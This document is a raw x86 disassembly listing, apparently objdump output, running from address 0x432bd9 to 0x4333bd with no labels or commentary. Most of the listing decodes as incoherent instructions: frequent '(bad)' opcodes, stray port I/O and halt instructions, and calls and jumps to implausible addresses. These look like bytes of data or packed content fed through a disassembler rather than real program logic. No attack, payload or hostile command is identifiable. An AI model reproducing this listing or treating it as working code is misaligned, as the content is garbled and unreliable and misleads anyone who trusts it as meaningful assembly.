  432bd9:	add    esp,eax
  432bdb:	sub    eax,eax
  432bdd:	or     BYTE PTR [ecx-0x77f474bb],cl
  432be3:	add    BYTE PTR [eax],al
  432be5:	mov    DWORD PTR [ebx-0x24],ebx
  432be8:	push   edi
  432be9:	push   ebp
  432bea:	clc    
  432beb:	add    DWORD PTR [esi+0x1b0100],0x45
  432bf2:	out    0xff,eax
  432bf4:	add    edx,DWORD PTR [eax]
  432bf6:	jmp    0x432be0
  432bf8:	cmp    ch,0x45
  432bfb:	(bad)  
  432bfc:	jmp    0x40c8b44e
  432c01:	je     0x432b8d
  432c03:	mov    eax,DWORD PTR [eax-0x10c78304]
  432c09:	inc    ebp
  432c0a:	add    BYTE PTR [ebx-0x770375],al
  432c10:	add    ah,ch
  432c12:	add    edx,esp
  432c14:	pop    edi
  432c15:	pop    ebp
  432c16:	push   ebp
  432c17:	inc    ebx
  432c18:	in     al,dx
  432c19:	pop    ebp
  432c1a:	in     al,dx
  432c1b:	cmp    edx,DWORD PTR [edi-0x8]
  432c1e:	xor    eax,0x895b9c94
  432c23:	leave  
  432c24:	call   0x8998732d
  432c29:	in     al,dx
  432c2a:	in     al,0x45
  432c2c:	dec    ebp
  432c2d:	push   esi
  432c2e:	test   DWORD PTR [eax+0xfb010f],esi
  432c34:	add    BYTE PTR [eax+0xc018b],dh
  432c3a:	leave  
  432c3b:	inc    ebp
  432c3c:	test   al,ch
  432c3e:	add    dh,bh
  432c40:	add    bh,bh
  432c42:	dec    ebp
  432c43:	push   cs
  432c44:	mov    DWORD PTR [ecx],eax
  432c46:	hlt    
  432c47:	push   es
  432c48:	dec    ebp
  432c49:	leave  
  432c4a:	mov    DWORD PTR [eax],ecx
  432c4c:	clc    
  432c4d:	cmovge eax,ecx
  432c50:	mov    ecx,0x85c2f0
  432c56:	clc    
  432c57:	pop    DWORD PTR [ebp+0x1]
  432c5a:	push   ebx
  432c5b:	add    BYTE PTR [ebp-0x15],bh
  432c5e:	push   esi
  432c5f:	xor    eax,0x898a45
  432c64:	cld    
  432c65:	add    BYTE PTR [ebp+0x0],al
  432c68:	cmp    esp,DWORD PTR [esi-0x64]
  432c6b:	add    DWORD PTR [esi+0x78308c1],edi
  432c71:	add    ah,BYTE PTR [esi-0x49]
  432c74:	int    0xbb
  432c76:	mov    ecx,DWORD PTR [edi+0xc]
  432c79:	add    dh,al
  432c7b:	cmp    ecx,ebx
  432c7d:	jne    0x432c47
  432c7f:	xor    ecx,DWORD PTR [ebp+0x66]
  432c82:	jmp    0xca2c88
  432c87:	add    DWORD PTR [ebp+0x0],eax
  432c8a:	mov    eax,ebx
  432c8c:	or     al,0x8b
  432c8e:	(bad)  
  432c8f:	mov    ecx,esi
  432c91:	mov    BYTE PTR [eax+eax*1+0x664c134],cl
  432c98:	mov    eax,edi
  432c9a:	or     BYTE PTR [edx],cl
  432c9c:	shl    cl,cl
  432c9e:	icebp  
  432c9f:	add    BYTE PTR [ebp+0x39],0x8b
  432ca3:	or     BYTE PTR [edx+eax*2],cl
  432ca6:	(bad)  
  432ca7:	or     cl,dh
  432ca9:	stc    
  432caa:	shl    DWORD PTR [ebp-0x30],0xc6
  432cae:	xor    al,0x0
  432cb0:	inc    ebp
  432cb1:	xchg   BYTE PTR [ebx],al
  432cb3:	add    esp,edi
  432cb5:	add    BYTE PTR [ebp-0x39],cl
  432cb8:	mov    al,bl
  432cba:	test   DWORD PTR [ebx+0x1c348375],ecx
  432cc0:	sub    al,0xbf
  432cc2:	jmp    0x432c49
  432cc4:	mov    edi,eax
  432cc6:	lock jge 0x432cba
  432cc9:	lea    esi,[edx-0x74bad501]
  432ccf:	mov    ebp,esp
  432cd1:	or     cl,dh
  432cd3:	leave  
  432cd4:	add    al,BYTE PTR [eax+eax*4-0x37ff9a00]
  432cdb:	dec    ebp
  432cdc:	dec    ebp
  432cdd:	test   DWORD PTR [ebx],eax
  432cdf:	paddb  mm6,mm0
  432ce2:	add    DWORD PTR [eax],eax
  432ce4:	dec    ebp
  432ce5:	mov    ecx,DWORD PTR [ebx-0x65b217f0]
  432ceb:	mov    esi,DWORD PTR [edx]
  432ced:	or     al,0x2b
  432cef:	dec    ebp
  432cf0:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  432cf6:	mov    esp,eax
  432cf8:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  432cff:	mov    DWORD PTR [ebx],ebp
  432d01:	call   0xc76b631
  432d06:	mov    DWORD PTR [ebp+0x10],ecx
  432d09:	(bad)  
  432d0a:	push   0x8b85ff10
  432d0f:	clc    
  432d10:	or     al,0x53
  432d12:	(bad)  
  432d13:	push   ecx
  432d14:	retf   
  432d15:	mov    ebx,0xff4d8dc8
  432d1a:	mov    DWORD PTR [ebp+0x8],eax
  432d1d:	xor    eax,DWORD PTR [ebp-0x75]
  432d20:	cmp    ebp,DWORD PTR [ebx]
  432d22:	lsl    ebx,WORD PTR [edi-0x8]
  432d26:	call   DWORD PTR [ebx-0x741bff75]
  432d2c:	(bad)  
  432d2d:	or     al,0x5b
  432d2f:	dec    ebp
  432d30:	or     BYTE PTR [ebx],dh
  432d32:	inc    ebp
  432d33:	xor    esi,DWORD PTR ds:0x708088d
  432d39:	in     eax,0x9a
  432d3b:	add    BYTE PTR [edx],dh
  432d3d:	inc    ebp
  432d3e:	pop    edi
  432d3f:	xor    eax,edx
  432d41:	test   DWORD PTR [eax],0x81108b8b
  432d47:	dec    ebp
  432d48:	sub    al,0x33
  432d4a:	add    BYTE PTR [ebx],dh
  432d4c:	push   esi
  432d4d:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  432d53:	mov    edi,eax
  432d55:	or     BYTE PTR [ebp+0x45],al
  432d58:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  432d5e:	xor    eax,0xc7069cc9
  432d63:	inc    ebp
  432d64:	cld    
  432d65:	cmp    DWORD PTR [ebp+0x454df817],eax
  432d6b:	cmp    BYTE PTR ds:0xc7669c53,0xd1
  432d72:	in     al,0x4d
  432d74:	xchg   BYTE PTR [eax-0x3dbaac08],al
  432d7a:	aad    0xe9
  432d7c:	xlat   BYTE PTR ds:[ebx]
  432d7d:	rol    bh,cl
  432d7f:	mov    edx,esp
  432d81:	or     BYTE PTR [ebp+0x4588f84d],al
  432d87:	mov    ecx,DWORD PTR [eax]
  432d89:	or     BYTE PTR [eax],al
  432d8b:	push   ebp
  432d8c:	mov    edi,DWORD PTR [eax+0xfc728b]
  432d92:	dec    ebp
  432d93:	enter  0xceba,0x8
  432d97:	retf   0x1807
  432d9a:	ret    0x9a4d
  432d9d:	mov    esi,DWORD PTR [edx]
  432d9f:	or     al,0x33
  432da1:	into   
  432da2:	add    edx,esi
  432da4:	add    ecx,edx
  432da6:	bswap  eax
  432da8:	ror    esi,0x98
  432dab:	dec    ebp
  432dac:	add    cl,ch
  432dae:	mov    edi,edi
  432db0:	hlt    
  432db1:	inc    esi
  432db3:	inc    ebp
  432db4:	ret    0x4533
  432db7:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  432dbd:	or     BYTE PTR [ebx],dh
  432dbf:	dec    ebp
  432dc0:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  432dc6:	jne    0xff8d2d8d
  432dcc:	inc    ebp
  432dcd:	inc    ebp
  432dce:	mov    esi,DWORD PTR [ebx]
  432dd0:	clc    
  432dd1:	pop    esi
  432dd2:	ret    0xcaeb
  432dd5:	mov    eax,esi
  432dd7:	call   0x520481aa
  432ddc:	dec    ebp
  432ddd:	add    eax,0xf8728b
  432de2:	adc    eax,0xce0ccac9
  432de7:	push   ebp
  432de8:	ret    0xc6ec
  432deb:	in     al,dx
  432dec:	call   0x33437af5
  432df1:	push   edi
  432df2:	add    edi,eax
  432df4:	xor    eax,eax
  432df6:	jmp    0x432e3d
  432df8:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  432dfe:	add    eax,edi
  432e00:	shr    eax,cl
  432e02:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  432e08:	mov    esi,DWORD PTR [esp+ebp*8]
  432e0b:	pushf  
  432e0c:	ret    0x84c7
  432e0f:	fcomp  DWORD PTR [edx-0x7607cd7b]
  432e15:	inc    ebp
  432e16:	in     al,dx
  432e17:	xor    eax,0xc78b9c45
  432e1c:	cld    
  432e1d:	fmul   st(2),st
  432e1f:	sbb    dl,al
  432e21:	jmp    0x9c3b:0x364d45c1
  432e28:	jbe    0x432df1
  432e2a:	mov    esp,eax
  432e2c:	clc    
  432e2d:	add    BYTE PTR [ebp+0x0],cl
  432e30:	mov    ecx,ecx
  432e32:	lea    eax,[ebp-0x5]
  432e35:	mov    edi,edi
  432e37:	call   0x51ce8181
  432e3c:	hlt    
  432e3d:	xor    eax,edx
  432e3f:	mov    esi,0x9a7284
  432e44:	xor    cl,dl
  432e46:	mov    esi,eax
  432e48:	hlt    
  432e49:	into   
  432e4a:	inc    ebp
  432e4b:	scas   eax,DWORD PTR es:[edi]
  432e4c:	mov    ebp,ecx
  432e4e:	cld    
  432e4f:	add    dl,cl
  432e51:	add    dl,al
  432e53:	inc    ebp
  432e54:	shr    DWORD PTR [ebx],0x4d
  432e57:	xor    edi,DWORD PTR [ebx]
  432e59:	mov    DWORD PTR [edi],ecx
  432e5b:	clc    
  432e5c:	dec    esi
  432e5d:	inc    ebp
  432e5e:	dec    DWORD PTR [ebx-0x3d2b1775]
  432e64:	ret    0xc6ca
  432e67:	mov    BYTE PTR [ebp-0x32],0x53
  432e6b:	scas   eax,DWORD PTR es:[edi]
  432e6c:	inc    ebp
  432e6d:	jmp    0x432ea5
  432e6f:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  432e76:	pop    ebx
  432e77:	xor    ecx,DWORD PTR [ebp+0x3]
  432e7a:	mov    eax,DWORD PTR [ebx]
  432e7c:	clc    
  432e7d:	test   edx,ecx
  432e7f:	mov    ecx,esi
  432e81:	cld    
  432e82:	call   0x8ab773cc
  432e87:	xor    ecx,DWORD PTR [eax+0x4533f303]
  432e8d:	add    ecx,DWORD PTR [ebx-0x4974072d]
  432e93:	fdiv   QWORD PTR [ebx]
  432e95:	retf   0xce89
  432e98:	in     al,0xc1
  432e9a:	inc    ebp
  432e9b:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  432ea1:	into   
  432ea2:	mov    dh,0xc1
  432ea5:	call   0x8c17742e
  432eaa:	(bad)  
  432eab:	cld    
  432eac:	mov    ecx,DWORD PTR [ebp-0x14]
  432eaf:	xor    eax,ecx
  432eb1:	lea    eax,[ebp+0x8]
  432eb4:	mov    esi,DWORD PTR [edx-0x4]
  432eb7:	add    dl,al
  432eb9:	inc    ebp
  432eba:	mov    esp,0x32d89a8b
  432ebf:	dec    ebp
  432ec0:	mov    esi,DWORD PTR [ebx]
  432ec2:	cld    
  432ec3:	xor    eax,edx
  432ec5:	sub    esp,DWORD PTR [esi-0x75]
  432ec8:	int    0xec
  432eca:	sub    ecx,eax
  432ecc:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  432ed2:	mov    esi,esp
  432ed4:	call   0x34177c5d
  432ed9:	inc    DWORD PTR [ebx]
  432edb:	mov    edi,DWORD PTR [ebx]
  432edd:	cld    
  432ede:	jne    0x432f2d
  432ee0:	mov    esi,DWORD PTR [ebx]
  432ee2:	aam    0x8d
  432ee4:	dec    ebp
  432ee5:	or     BYTE PTR [ebx],dh
  432ee7:	jb     0x432eec
  432ee9:	add    BYTE PTR [edi+0x45],bl
  432eec:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  432ef3:	xor    ebp,esp
  432ef5:	xor    eax,edi
  432ef7:	sub    edi,esp
  432ef9:	mov    eax,DWORD PTR [ebp+0x34c8f8f4]
  432eff:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  432f06:	inc    ebp
  432f07:	xor    ecx,DWORD PTR [ecx+0x45891403]
  432f0d:	clc    
  432f0e:	mov    eax,edi
  432f10:	nop
  432f11:	fadd   QWORD PTR [eax]
  432f13:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  432f19:	jmp    0x432ea4
  432f1b:	mov    eax,DWORD PTR [ecx]
  432f1d:	fadd   DWORD PTR [eax]
  432f1f:	inc    ebp
  432f20:	or     DWORD PTR [ebx],esi
  432f22:	dec    eax
  432f23:	add    edx,DWORD PTR [ebx-0x2d]
  432f26:	dec    ebp
  432f27:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  432f2d:	inc    ebp
  432f2e:	push   ebx
  432f2f:	mov    dl,BYTE PTR [ecx-0xd]
  432f32:	xor    ecx,DWORD PTR [ebp-0x45]
  432f35:	(bad)  
  432f37:	rol    BYTE PTR [eax],0xc1
  432f3a:	ret    
  432f3b:	inc    ebp
  432f3c:	inc    ebp
  432f3d:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  432f43:	xor    eax,ebx
  432f45:	add    eax,DWORD PTR [ebp+0x23]
  432f48:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  432f4e:	cmp    edi,0xc
  432f51:	dec    ebp
  432f52:	inc    ebp
  432f53:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  432f59:	inc    ebp
  432f5a:	mov    esi,DWORD PTR [ebx]
  432f5c:	clc    
  432f5d:	lea    eax,[ebp+0x45725407]
  432f63:	add    BYTE PTR [ebp+eax*2-0x75],dh
  432f67:	xor    edi,DWORD PTR [eax]
  432f69:	mov    ecx,0xff8b8d4d
  432f6e:	push   esp
  432f6f:	enter  0x4df7,0x23
  432f73:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  432f79:	mov    eax,DWORD PTR [ebx]
  432f7b:	loopne 0x432f68
  432f7d:	ret    0xc68b
  432f80:	push   esp
  432f81:	enter  0x9745,0x8b
  432f85:	inc    ebp
  432f86:	cld    
  432f87:	mov    eax,edi
  432f89:	clc    
  432f8a:	ret    
  432f8b:	ret    0xc645
  432f8e:	mov    esi,DWORD PTR [ebx]
  432f90:	cld    
  432f91:	pop    esi
  432f92:	mov    ebx,0x83458bc3
  432f98:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  432f9c:	dec    ebp
  432f9d:	xor    eax,0xba039c33
  432fa2:	mov    DWORD PTR [ebp+0x55d8f889],eax
  432fa8:	inc    ebp
  432fa9:	mov    edi,DWORD PTR [ebx]
  432fab:	adc    al,0x9c
  432fad:	inc    ebp
  432fae:	(bad)  
  432faf:	mov    ebx,eax
  432fb1:	adc    al,0x85
  432fb3:	cmp    al,0x1
  432fb6:	inc    ebp
  432fb7:	add    BYTE PTR [ecx],bh
  432fb9:	dec    ebp
  432fba:	pushf  
  432fbb:	mov    ebp,ecx
  432fbd:	mov    eax,DWORD PTR [ebx]
  432fbf:	nop
  432fc0:	add    BYTE PTR [eax],al
  432fc2:	inc    ebp
  432fc3:	mov    esi,DWORD PTR [ebx]
  432fc5:	add    eax,DWORD PTR [ebx]
  432fc7:	cmp    al,0x89
  432fc9:	mov    esp,esi
  432fcb:	clc    
  432fcc:	inc    ebp
  432fcd:	inc    ebp
  432fce:	add    edx,DWORD PTR [esi+0xc]
  432fd1:	mov    edi,0x7ff0845
  432fd6:	in     al,dx
  432fd7:	(bad)  
  432fd8:	jne    0x432f74
  432fda:	mov    esi,DWORD PTR [edx]
  432fdc:	clc    
  432fdd:	add    ebp,DWORD PTR [esi]
  432fdf:	mov    edi,edi
  432fe1:	in     al,dx
  432fe2:	mov    DWORD PTR [ebp-0x10],eax
  432fe5:	xor    eax,DWORD PTR [ebp+0x3]
  432fe8:	cmp    eax,0x8bf49c89
  432fed:	inc    ebp
  432fee:	fmul   DWORD PTR [ebx-0x173caf39]
  432ff4:	lea    ecx,[ecx+0x45e8d4bc]
  432ffa:	clc    
  432ffb:	mov    edi,edi
  432ffd:	cmp    BYTE PTR [ebp+0x4d],al
  433000:	test   DWORD PTR [eax+0x74],ecx
  433003:	inc    ecx
  433004:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  43300a:	ret    
  43300b:	inc    eax
  43300c:	dec    DWORD PTR [ebx+0x4945f8f0]
  433012:	push   eax
  433013:	dec    eax
  433014:	test   al,0xd0
  433016:	dec    eax
  433018:	mov    eax,DWORD PTR [ebp-0x14]
  43301b:	mov    eax,DWORD PTR [ebp+0x38]
  43301e:	mov    eax,ecx
  433020:	fadd   DWORD PTR [ebx]
  433022:	dec    ebp
  433023:	inc    eax
  433024:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  43302a:	inc    ebp
  43302b:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  433031:	fadd   QWORD PTR [ebx]
  433033:	inc    ebp
  433034:	or     al,0x33
  433036:	dec    ebp
  433037:	add    edi,DWORD PTR [ebx]
  433039:	mov    DWORD PTR [edx-0x28],esi
  43303c:	mov    eax,DWORD PTR [ebp-0x10]
  43303f:	mov    eax,DWORD PTR [eax+0x10]
  433042:	mov    eax,edi
  433044:	lock ret 
  433046:	inc    ecx
  433047:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  43304d:	fsubr  st,st(5)
  43304f:	test   DWORD PTR [eax],eax
  433051:	clc    
  433052:	push   0x45
  433054:	(bad)  
  433055:	cmp    ch,ah
  433057:	pushf  
  433058:	inc    ebp
  433059:	(bad)  
  43305a:	push   eax
  43305b:	fsub   DWORD PTR [eax-0x7b]
  43305e:	(bad)  
  43305f:	clc    
  433060:	mov    eax,0xf8008584
  433065:	mov    eax,DWORD PTR [ebp-0x4]
  433068:	mov    edi,0x4585c3cc
  43306e:	clc    
  43306f:	mov    eax,DWORD PTR [ebp+0x14]
  433072:	cmp    eax,DWORD PTR [ebp-0x64]
  433075:	mov    edi,eax
  433077:	in     al,dx
  433078:	les    esi,FWORD PTR [ebp-0x7b]
  43307b:	mov    edi,eax
  43307d:	or     al,0x4d
  43307f:	dec    ebp
  433080:	mov    eax,ebp
  433082:	in     al,0xf2
  433084:	dec    ebp
  433085:	dec    DWORD PTR [ecx+0x4dc7e045]
  43308b:	fmul   DWORD PTR [ecx+0x4df8f085]
  433091:	inc    ebp
  433092:	mov    DWORD PTR [ebx],esi
  433094:	fadd   QWORD PTR [ebx]
  433096:	dec    ebp
  433097:	push   eax
  433098:	xor    eax,DWORD PTR [ebp+0x3]
  43309b:	push   eax
  43309c:	mov    DWORD PTR [eax+ebx*8],ebx
  43309f:	push   esi
  4330a1:	mov    eax,DWORD PTR [eax]
  4330a3:	lock cmp eax,0xf84e85c0
  4330a9:	inc    ebp
  4330aa:	test   BYTE PTR [ebx],dh
  4330ac:	add    DWORD PTR [ebx],eax
  4330ae:	add    BYTE PTR [eax+0x4d],dl
  4330b1:	jne    0x4330e6
  4330b3:	lea    ecx,[ebx-0x7617fc44]
  4330b9:	div    ah
  4330bb:	inc    DWORD PTR [ebp+0x45]
  4330be:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  4330c4:	jb     0x433051
  4330c6:	add    BYTE PTR [eax*2-0x17ba743f],cl
  4330cd:	mov    ecx,DWORD PTR [ebp-0x10]
  4330d0:	xor    ecx,DWORD PTR [ebp+0x3]
  4330d3:	mov    edi,DWORD PTR [ebx]
  4330d5:	adc    BYTE PTR [ebp+0x41],dh
  4330d8:	mov    ecx,DWORD PTR [ebx-0x37382704]
  4330de:	ret    
  4330df:	push   ss
  4330e0:	push   0x45
  4330e2:	lea    ecx,[ebx+0x4de80cb0]
  4330e8:	sti    
  4330e9:	add    edi,edi
  4330eb:	or     BYTE PTR [ebp+0x4d],al
  4330ee:	mov    ebp,DWORD PTR [ebx]
  4330f0:	xor    ebp,ecx
  4330f2:	mov    al,BYTE PTR [edx]
  4330f4:	add    eax,0xc7200
  4330f9:	jne    0x433148
  4330fb:	lea    esi,[ebx]
  4330fd:	mov    al,0xf
  4330ff:	call   0xf27c4
  433104:	shl    DWORD PTR ds:0x89019c84,0x0
  43310b:	rol    BYTE PTR [ebp+0x45],1
  43310e:	mov    esi,DWORD PTR [ebx+esi*1]
  433111:	pushf  
  433112:	mov    al,bh
  433114:	add    eax,0x8572c8
  433119:	clc    
  43311a:	dec    ebp
  43311b:	inc    ebp
  43311c:	xor    edi,DWORD PTR [edx]
  43311e:	setl   al
  433121:	(bad)  
  433122:	retf   
  433123:	rol    cl,1
  433125:	dec    ebp
  433126:	test   BYTE PTR [ebp+0x4d00cc01],cl
  43312c:	inc    ebp
  43312d:	lea    ecx,[ebx-0x75b2cc38]
  433133:	lea    eax,ds:0x4d72c4
  433139:	mov    ecx,DWORD PTR [ebp-0x4]
  43313c:	xor    ecx,edi
  43313e:	bswap  ebx
  433140:	ror    BYTE PTR [ebp-0x35],0xe9
  433144:	rol    DWORD PTR [ecx],0x84
  433147:	add    BYTE PTR [ecx],al
  433149:	cmp    eax,DWORD PTR [eax]
  43314b:	pushf  
  43314c:	inc    ebp
  43314d:	jnp    0x8a436550
  433153:	mov    eax,DWORD PTR ds:0xcf72e8
  433159:	lock dec ebp
  43315b:	retf   
  43315c:	xor    ecx,DWORD PTR [ebp+0xf]
  43315f:	mov    eax,eax
  433161:	fmul   st,st(3)
  433163:	test   ecx,0x19a8484
  433169:	xor    al,BYTE PTR [eax]
  43316b:	mov    DWORD PTR [ebp-0x28],eax
  43316e:	mov    eax,DWORD PTR [ebp+0x33]
  433171:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  433177:	ret    
  433178:	add    al,cl
  43317a:	dec    ebp
  43317b:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  433181:	add    ecx,DWORD PTR ds:0xc7250
  433187:	inc    ebp
  433188:	rcl    DWORD PTR [eax+0x4d],0x2b
  43318c:	mov    edi,edi
  43318e:	xor    ecx,DWORD PTR [ebx+0xde48a]
  433194:	jb     0x43315d
  433196:	add    BYTE PTR [ecx+eax*8-0x74cdb2b6],al
  43319d:	mov    esi,DWORD PTR [ebx]
  43319f:	cld    
  4331a0:	mov    cl,bh
  4331a2:	or     eax,0x372b6
  4331a7:	cmp    ecx,eax
  4331a9:	jne    0x433226
  4331af:	mov    eax,DWORD PTR [ebp-0x20]
  4331b2:	mov    eax,DWORD PTR [eax]
  4331b4:	xor    eax,edi
  4331b6:	mov    al,BYTE PTR [ebp+eax*1+0x32724a]
  4331bd:	mov    ecx,DWORD PTR [ebp-0x4]
  4331c0:	mov    ecx,edi
  4331c2:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  4331c8:	jb     0x4331d9
  4331ca:	add    BYTE PTR [edi-0x3f],dl
  4331cd:	add    BYTE PTR [ebp-0x75],cl
  4331d0:	mov    esi,eax
  4331d2:	xor    eax,DWORD PTR [eax]
  4331d4:	mov    al,bh
  4331d6:	or     eax,0x4a7284
  4331db:	xor    al,cl
  4331dd:	mov    ecx,DWORD PTR [ebp-0x4]
  4331e0:	mov    ecx,edi
  4331e2:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  4331e8:	jb     0x4331f9
  4331ea:	add    BYTE PTR [edi],dh
  4331ec:	enter  0x8500,0x8b
  4331f0:	add    ah,bl
  4331f2:	add    BYTE PTR [eax],al
  4331f4:	inc    ebp
  4331f5:	(bad)  
  4331f6:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a4a]
  4331fd:	mov    esi,DWORD PTR [edx-0x4]
  433200:	add    bh,cl
  433202:	dec    ebp
  433203:	mov    dh,0x8b
  433205:	add    esi,DWORD PTR [ebx]
  433207:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  43320d:	add    BYTE PTR [eax],al
  43320f:	mov    eax,ecx
  433211:	loopne 0x433260
  433213:	add    BYTE PTR [ebx-0x757bcc39],cl
  433219:	dec    edx
  43321a:	or     eax,0x8b7232
  43321f:	in     al,0xc1
  433221:	or     DWORD PTR [ebp-0x31],ecx
  433224:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4a]
  43322b:	xor    dh,BYTE PTR [edx-0x75]
  43322e:	add    al,dh
  433230:	enter  0x4f09,0xcf
  433234:	inc    ebp
  433235:	mov    WORD PTR [ebx-0x75cdccb6],cs
  43323b:	or     al,BYTE PTR ds:0xe4728b
  433241:	or     DWORD PTR [ebp-0x31],ecx
  433244:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4e]
  43324b:	cmp    dh,BYTE PTR [edx+0xf]
  43324e:	add    bl,dl
  433250:	rol    DWORD PTR [eax],0x4d
  433253:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  433259:	(bad)  
  43325a:	or     eax,0x4a7284
  43325f:	xor    al,cl
  433261:	mov    ecx,DWORD PTR [ebp-0x20]
  433264:	mov    ecx,DWORD PTR [ecx]
  433266:	xor    ecx,edi
  433268:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724a]
  43326f:	xor    cl,al
  433271:	mov    ecx,DWORD PTR [edi]
  433273:	fadd   QWORD PTR [ebp+0x9]
  433276:	call   0xffd02d4a
  43327b:	dec    edx
  43327c:	dec    ebp
  43327d:	xor    bh,BYTE PTR [ebx]
  43327f:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  433283:	loopne 0x433281
  433285:	or     edi,eax
  433287:	iret   
  433288:	ret    
  433289:	mov    WORD PTR [ebp+0x4e],es
  43328c:	mov    esi,DWORD PTR [edx]
  43328e:	call   0x8452f9cd
  433293:	(bad)  
  433294:	call   0x8bdc:0x338b3200
  43329b:	add    ah,bh
  43329d:	(bad)  
  43329e:	push   ebp
  43329f:	test   BYTE PTR [ebx],dh
  4332a1:	dec    edx
  4332a2:	add    esi,DWORD PTR [edx]
  4332a4:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  4332aa:	dec    edi
  4332ac:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d4a]
  4332b3:	xor    al,BYTE PTR [ebx]
  4332b5:	mov    edi,DWORD PTR [ebx]
  4332b7:	in     al,0x75
  4332b9:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  4332bf:	dec    edx
  4332c0:	xor    esi,DWORD PTR [edx]
  4332c2:	lea    ecx,[edx]
  4332c4:	or     BYTE PTR [ebx+0x900f072],cl
  4332ca:	ja     0x43329b
  4332cc:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b2],cl
  4332d3:	cmp    ch,al
  4332d5:	jne    0x4332ca
  4332d7:	mov    edi,edi
  4332d9:	fadd   QWORD PTR [ebp+0x0]
  4332dc:	mov    eax,edi
  4332de:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb6]
  4332e5:	mov    edx,DWORD PTR [ebx]
  4332e7:	in     al,0x45
  4332e9:	or     DWORD PTR [ebx],esi
  4332eb:	iret   
  4332ec:	add    ecx,DWORD PTR [eax+edx*2+0x4532184a]
  4332f3:	xor    dl,BYTE PTR [eax-0x75]
  4332f6:	sbb    al,0xe0
  4332f8:	dec    DWORD PTR [ecx]
  4332fa:	mov    ecx,edi
  4332fc:	in     al,dx
  4332fd:	mov    eax,es
  4332ff:	dec    edx
  433300:	mov    DWORD PTR [edx],esi
  433302:	fmul   QWORD PTR [edx]
  433304:	jne    0x433291
  433306:	(bad)  
  433307:	(bad)  
  433309:	or     DWORD PTR [ebp-0x31],eax
  43330c:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b2]
  433313:	cmp    bh,bh
  433315:	jne    0x43335c
  433317:	lea    ecx,[ebx-0x38372750]
  43331d:	inc    ebx
  43331f:	mov    eax,ecx
  433321:	mov    eax,0xa00c111
  433326:	jne    0x43336d
  433328:	mov    esi,DWORD PTR [ebx]
  43332a:	test   al,0x3
  43332c:	inc    ebp
  43332d:	mov    DWORD PTR [eax-0xc],edx
  433330:	loop   0x433377
  433332:	push   DWORD PTR [ebx]
  433334:	mov    ecx,DWORD PTR [ebp+0x724d3010]
  43333a:	add    DWORD PTR [eax],eax
  43333c:	mov    eax,edi
  43333e:	lods   al,BYTE PTR ds:[esi]
  43333f:	dec    ebp
  433340:	inc    ebp
  433341:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  433347:	retf   
  433348:	mov    edx,ecx
  43334a:	adc    al,0x84
  43334c:	(bad)  
  43334d:	std    
  43334e:	ret    
  43334f:	jmp    FWORD PTR [edi-0x2b7474bb]
  433355:	hlt    
  433356:	rol    edi,0x82
  433359:	ret    
  43335a:	cld    
  43335b:	enter  0x11ff,0x45
  43335f:	inc    ebp
  433360:	pop    edi
  433361:	mov    ebx,DWORD PTR [ebx+0x14]
  433364:	ret    0xc7
  433367:	test   BYTE PTR [ebx+0x4532519a],cl
  43336d:	jmp    0x4332fa
  43336f:	push   0x8
  433371:	call   DWORD PTR [esi]
  433373:	in     al,dx
  433374:	add    BYTE PTR [ebp+0x1],0x50
  433378:	add    bh,ah
  43337a:	add    bh,bh
  43337c:	icebp  
  43337d:	mov    ecx,DWORD PTR [eax]
  43337f:	cld    
  433380:	pop    es
  433381:	dec    ebp
  433382:	shl    DWORD PTR [ebx],0x72
  433385:	add    eax,DWORD PTR [eax]
  433387:	cmp    edx,ecx
  433389:	je     0x43339b
  43338b:	mov    esi,DWORD PTR [ebp-0x4]
  43338e:	inc    edi
  433390:	or     al,0xc3
  433392:	jmp    FWORD PTR [edx-0x18]
  433395:	(bad)  
  433396:	sti    
  433397:	cwde   
  433398:	(bad)  
  433399:	call   0xffa12ca4
  43339e:	or     al,0x45
  4333a0:	push   ebp
  4333a1:	sub    esp,0x18
  4333a4:	push   ebx
  4333a5:	inc    ebp
  4333a6:	mov    edi,edi
  4333a8:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  4333af:	test   al,0x53
  4333b1:	inc    ebp
  4333b2:	push   ecx
  4333b3:	push   eax
  4333b4:	xor    ebp,DWORD PTR [ebx-0x748d0041]
  4333ba:	add    ah,bh
  4333bc:	(bad)  
  4333bd:	dec    ebp
